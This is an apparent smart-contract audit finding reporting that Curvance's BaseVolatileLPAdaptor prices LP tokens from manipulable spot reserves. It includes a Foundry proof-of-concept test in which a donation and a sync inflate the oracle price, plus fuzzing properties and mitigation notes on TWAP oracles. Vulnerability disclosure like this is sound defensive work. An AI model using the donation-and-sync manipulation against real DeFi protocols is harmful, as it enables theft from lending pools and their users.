# BaseVolatileLPAdaptor uses Spot Reserves, and is vulnerable to Manipulation

## Executive Summary

Because the `BaseVolatileLPAdaptor` uses `getReserves`, which is subject to manipulation

Oracle prices can be manipulated at no cost by an attacker

## Impact

The pricing formula of k*y=k will hold >AFTER< arbitrage

However, the Curvance Oracle uses Spot Reserves

Due to this, Swaps done via the Router will make the formula hold

But swaps that cause a loss to the swapper, done directly via `Pool.swap` will manipulate the price

## POC

To demonstrate the vulnerabily, I've used Medusa via the Recon Boilerplate

I setup the Fuzzer to have an initial price
And wrote the following properties:

```solidity
// SPDX-License-Identifier: GPL-2.0
pragma solidity ^0.8.0;

import {Asserts} from "@chimera/Asserts.sol";
import {Setup} from "./Setup.sol";

abstract contract Properties is Setup, Asserts {
    uint256 RECON_THRESHOLD = 25;

    function crytic_price_cannot_change_byThresholdUp() public view returns (bool) {
        return initialPrice * RECON_THRESHOLD >= getCurrentPrice();
    }

    function crytic_price_cannot_change_byThresholdDown() public view returns (bool) {
        return initialPrice <= getCurrentPrice() * RECON_THRESHOLD;
    }
}

```

`crytic_price_cannot_change_byThresholdUp` is broken when the price of the LP tokens goes above 25 times

The threshold can be customized at will


## Attack POC

```solidity
    /// @dev Shows that price can be inflated via donation
    function test_crytic_price_cannot_change_byThresholdUp_25x2() public {
        console2.log("initialPrice", initialPrice);
        console2.log("getCurrentPrice()", getCurrentPrice());
        donateBoth(120209876281281145568259943);
        console2.log("getCurrentPrice()", getCurrentPrice());
        sync();
        console2.log("getCurrentPrice()", getCurrentPrice());
        assertTrue(crytic_price_cannot_change_byThresholdUp(), "Price is manipulatable"); // Fails
    }
```


Run via:
```forge test --match-test test_crytic_price_cannot_change_byThresholdUp_25x2 -vv```

And we see that the price did indeed skyrocket
```solidity
[FAIL. Reason: Price is manipulatable] test_crytic_price_cannot_change_byThresholdUp_25x2() (gas: 96240)
Logs:
  theData.length 11636
  initialPrice 2000000000000000000
  getCurrentPrice() 2000000000000000000
  getCurrentPrice() 2000000000000000000
  getCurrentPrice() 242419752562562291136
```

## Additional notes

The full POC is available here:
TODO

The Oracle code was simplified to this:

```solidity
function getPrice(address asset) public view returns (uint256 finalPrice) {
        // Cache AdaptorData and grab pool tokens.
        // AdaptorData memory data = adaptorData[asset]; // NOTE: Replace by token0 and token1
        IUniV2Pool pool = IUniV2Pool(asset);

        // Query LP total supply.
        uint256 totalSupply = pool.totalSupply();
        if (totalSupply == 0) {
            return 0;
        }
        // Query LP reserves.
        (uint256 reserve0, uint256 reserve1,) = pool.getReserves();
        // convert to 18 decimals.
        reserve0 = (reserve0 * 1e18) / (10 ** 18);
        reserve1 = (reserve1 * 1e18) / (10 ** 18);

        // sqrt(reserve0 * reserve1).
        uint256 sqrtReserve = FixedPointMathLib.sqrt(reserve0 * reserve1);

        uint256 price0 = 1e18;
        uint256 price1 = 1e18;

        // price = 2 * sqrt(reserve0 * reserve1) * sqrt(price0 * price1) / totalSupply.
        uint256 finalPrice = (2 * sqrtReserve * FixedPointMathLib.sqrt(price0 * price1)) / totalSupply;

        return finalPrice;
    }
```

## Mitigation

From researching other potential at risk protocols I've found this article:
https://tarotfinance.medium.com/tarot-price-oracle-on-chain-manipulation-resistant-deb681c885a4

Tarot uses a 1200 seconds (20 minutes) TWAP that reads the Pair Cumulative to ensure that reserves are post arbitrage

It's worth noting that the TWAP is attackable, however the cost of attacking Tarot is effectively the cost of bringing the price up by 1200 times for at least one block (2 seconds on FTM)

There also seem to be a pricing formula written by the Uniswap team 4 years ago which is safer than the current implementation, although Oracle Drift (imprecision of oracle updates) is not taken into account

The formula is available here:
https://github.com/Uniswap/v2-periphery/blob/0335e8f7e1bd1e8d8329fd300aea2ef2f36dd19f/contracts/libraries/UniswapV2LiquidityMathLibrary.sol#L42

TODO: I'm investigating the security of other methods and currently don't seem convinced that there's a fair way to price LP tokens that is not risk prone